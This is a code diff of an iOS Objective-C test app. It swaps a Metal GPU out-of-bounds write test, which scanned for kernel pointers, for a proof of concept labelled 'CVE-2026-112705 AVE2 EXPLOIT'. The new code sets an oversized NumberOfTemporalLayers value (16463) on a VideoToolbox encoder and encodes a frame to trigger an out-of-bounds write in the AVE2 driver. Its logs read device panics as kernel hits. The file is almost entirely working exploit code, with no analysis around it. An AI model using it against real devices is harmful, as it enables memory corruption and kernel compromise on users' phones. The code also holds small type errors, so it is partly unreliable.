@@ -1,6 +1,7 @@
 #import <Foundation/Foundation.h>
-#import <Metal/Metal.h>
 #import <UIKit/UIKit.h>
+#import <VideoToolbox/VideoToolbox.h>
+#import <CoreMedia/CoreMedia.h>
 #import <sys/utsname.h>
 
 @interface AppDelegate : UIResponder <UIApplicationDelegate>
@@ -36,119 +37,149 @@
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
     
-    [self log:@"=== METAL GPU OOB TEST ==="];
+    [self log:@"=== CVE-2026-112705 AVE2 EXPLOIT ==="];
     
     struct utsname uts;
     uname(&uts);
     [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
     
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        [self runMetalTest];
+        [self runAVE2Exploit];
     });
     
     return YES;
 }
 
-- (void)runMetalTest {
-    // Step 1: Get Metal device
-    [self log:@"[1] Getting Metal device..."];
-    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
-    if (!dev) {
-        [self log:@"FAIL: No Metal device"];
+- (void)runAVE2Exploit {
+    [self log:@"[1] Creating VTCompressionSession..."];
+    
+    // Create compression session
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        NULL,  // allocator
+        1920,  // width
+        1080,  // height
+        kCMVideoCodecType_H264,  // codec
+        NULL,  // encoder specification
+        NULL,  // source image buffer attributes
+        NULL,  // compressed data allocator
+        NULL,  // output callback
+        NULL,  // output callback refcon
+        &session
+    );
+    
+    if (status != noErr || !session) {
+        [self log:[NSString stringWithFormat:@"FAIL: VTCompressionSessionCreate: %d", (int)status]];
         return;
     }
-    [self log:[NSString stringWithFormat:@"PASS: %@", dev.name]];
+    [self log:@"PASS: Compression session created"];
     
-    // Step 2: Create many buffers
-    [self log:@"[2] Creating 100 Metal buffers..."];
-    #define BUF_COUNT 100
-    id<MTLBuffer> buffers[BUF_COUNT];
-    uint64_t gpu_addrs[BUF_COUNT];
-    
-    for (int i = 0; i < BUF_COUNT; i++) {
-        buffers[i] = [dev newBufferWithLength:0x10000 
-                                      options:MTLResourceStorageModeShared];
-        if (!buffers[i]) {
-            [self log:[NSString stringWithFormat:@"FAIL: Buffer %d creation failed", i]];
-            return;
-        }
-        gpu_addrs[i] = (uint64_t)buffers[i].gpuAddress;
+    // Step 2: Get supported properties
+    [self log:@"[2] Querying supported properties..."];
+    CFArrayRef supportedProps = NULL;
+    status = VTSessionCopySupportedPropertyDictionary(session, &supportedProps);
+    if (status != noErr) {
+        [self log:[NSString stringWithFormat:@"FAIL: CopySupportedPropertyDictionary: %d", (int)status]];
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
     }
-    [self log:[NSString stringWithFormat:@"PASS: %d buffers created", BUF_COUNT]];
     
-    // Step 3: Find adjacent buffers
-    [self log:@"[3] Checking for adjacency..."];
-    int adjacent_pairs = 0;
+    NSDictionary *props = (__bridge NSDictionary *)supportedProps;
+    [self log:[NSString stringWithFormat:@"Found %lu properties", (unsigned long)props.count]];
     
-    for (int i = 1; i < BUF_COUNT; i++) {
-        uint64_t delta = gpu_addrs[i] - gpu_addrs[i-1];
+    // Check if NumberOfTemporalLayers is supported
+    if (props[@"NumberOfTemporalLayers"]) {
+        [self log:@"PASS: NumberOfTemporalLayers is supported"];
+    } else {
+        [self log:@"WARNING: NumberOfTemporalLayers not in supported list"];
+    }
+    
+    // Step 3: Set NumberOfTemporalLayers to trigger OOB write
+    [self log:@"[3] Setting NumberOfTemporalLayers = 16463 (trigger OOB)..."];
+    
+    CFNumberRef temporalLayers = CFNumberCreate(NULL, kCFNumberIntType, &(int){16463});
+    status = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), temporalLayers);
+    CFRelease(temporalLayers);
+    
+    if (status != noErr) {
+        [self log:[NSString stringWithFormat:@"Property set returned: %d (may still trigger bug)", (int)status]];
+    } else {
+        [self log:@"Property set successfully"];
+    }
+    
+    // Step 4: Try to encode a frame to trigger the bug
+    [self log:@"[4] Creating sample buffer to trigger encode..."];
+    
+    // Create a simple CVPixelBuffer
+    CVPixelBufferRef pixelBuffer = NULL;
+    CFDictionaryRef pixelBufferAttrs = (__bridge CFDictionaryRef)@{
+        (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
+        (id)kCVPixelBufferWidthKey: @1920,
+        (id)kCVPixelBufferHeightKey: @1080,
+    };
+    
+    status = CVPixelBufferCreate(NULL, 1920, 1080, kCVPixelFormatType_32BGRA, pixelBufferAttrs, &pixelBuffer);
+    if (status != noErr) {
+        [self log:[NSString stringWithFormat:@"FAIL: CVPixelBufferCreate: %d", (int)status]];
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+    
+    [self log:@"PASS: Pixel buffer created"];
+    
+    // Lock and fill with pattern
+    CVPixelBufferLockBaseAddress(pixelBuffer, 0);
+    void *baseAddress = CVPixelBufferGetBaseAddress(pixelBuffer);
+    if (baseAddress) {
+        memset(baseAddress, 0x41, 1920 * 1080 * 4);
+    }
+    CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);
+    
+    // Create sample buffer
+    CMFormatDescriptionRef formatDesc = NULL;
+    CMVideoFormatDescriptionCreateForImageBuffer(NULL, pixelBuffer, &formatDesc);
+    
+    CMSampleBufferRef sampleBuffer = NULL;
+    CMSampleTimingInfo timing = {kCMTimeInvalid, kCMTimeZero, kCMTimeInvalid};
+    CMSampleBufferCreateForImageBuffer(NULL, pixelBuffer, YES, NULL, NULL, formatDesc, &timing, &sampleBuffer);
+    
+    if (sampleBuffer) {
+        [self log:@"PASS: Sample buffer created"];
         
-        // Log first few addresses
-        if (i <= 5) {
-            [self log:[NSString stringWithFormat:@"  [%d] 0x%llx -> [%d] 0x%llx (delta: 0x%llx)", 
-                      i-1, gpu_addrs[i-1], i, gpu_addrs[i], delta]];
-        }
+        // Encode — this triggers the OOB write in AVE2 driver
+        [self log:@"[5] Encoding frame (triggering OOB write)..."];
+        [self log:@"If device panics/reboots = OOB write hit kernel"];
+        [self log:@"If app crashes = OOB write hit userspace (still useful)"];
+        [self log:@"If nothing happens = bug not triggered"];
         
-        // Check if exactly 64KB apart (adjacent)
-        if (delta == 0x10000) {
-            adjacent_pairs++;
-            [self log:[NSString stringWithFormat:@"*** ADJACENT PAIR FOUND: %d and %d ***", i-1, i]];
+        status = VTCompressionSessionEncodeFrame(session, pixelBuffer, kCMTimeZero, kCMTimeInvalid, NULL, NULL, NULL);
+        
+        [self log:[NSString stringWithFormat:@"Encode returned: %d", (int)status]];
+        
+        // Wait a bit for async encode
+        [self log:@"Waiting for encode to complete..."];
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+            [self log:@"[6] Encode timeout — checking status..."];
             
-            // Step 4: Test OOB write
-            [self log:[NSString stringWithFormat:@"[4] Testing OOB write on pair %d/%d...", i-1, i]];
+            // Clean up
+            CFRelease(sampleBuffer);
+            CFRelease(formatDesc);
+            CVPixelBufferRelease(pixelBuffer);
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
             
-            uint32_t *prev_buf = (uint32_t *)buffers[i-1].contents;
-            uint32_t *next_buf = (uint32_t *)buffers[i].contents;
-            
-            // Mark next buffer start
-            *next_buf = 0x47474747;
-            [self log:@"  Marked next_buf[0] = 0x47474747"];
-            
-            // Write past prev buffer's end (at offset 64KB = index 16384)
-            prev_buf[0x10000/4] = 0x43434343;
-            [self log:@"  Wrote 0x43434343 to prev_buf[64KB]"];
-            
-            // Check if next buffer was hit
-            uint32_t check = *next_buf;
-            [self log:[NSString stringWithFormat:@"  next_buf[0] = 0x%x (expect 0x47474747 or 0x43434343)", check]];
-            
-            if (check == 0x43434343) {
-                [self log:@"*** METAL GPU OOB WRITE CONFIRMED ***"];
-                
-                // Step 5: Scan for kernel pointers
-                [self log:@"[5] Scanning for kernel pointers..."];
-                int ptr_count = 0;
-                for (int j = 0; j < 0x10000/8; j++) {
-                    uint64_t val = ((uint64_t *)next_buf)[j];
-                    if ((val >> 40) == 0xffffff || (val >> 44) == 0xfffff || 
-                        (val >> 48) == 0xffff) {
-                        [self log:[NSString stringWithFormat:@"  KERNEL PTR at +0x%x: 0x%llx", j*8, val]];
-                        ptr_count++;
-                        if (ptr_count >= 20) break;
-                    }
-                }
-                
-                if (ptr_count == 0) {
-                    [self log:@"  No kernel pointers found"];
-                } else {
-                    [self log:[NSString stringWithFormat:@"  Found %d kernel pointers", ptr_count]];
-                }
-                
-                break;  // Found working pair, stop
-            } else if (check == 0x47474747) {
-                [self log:@"  No OOB hit (buffer not adjacent in physical memory)"];
-            } else {
-                [self log:[NSString stringWithFormat:@"  Unexpected value: 0x%x", check]];
-            }
-        }
+            [self log:@"=== EXPLOIT COMPLETE ==="];
+            [self log:@"If device is still running, OOB write may have succeeded silently"];
+            [self log:@"Check kernel logs or system behavior for anomalies"];
+        });
+    } else {
+        [self log:@"FAIL: Could not create sample buffer"];
+        CVPixelBufferRelease(pixelBuffer);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
     }
-    
-    if (adjacent_pairs == 0) {
-        [self log:@"No adjacent buffer pairs found"];
-        [self log:@"GPU driver is isolating allocations"];
-    }
-    
-    [self log:@"=== TEST COMPLETE ==="];
 }
 
 @end
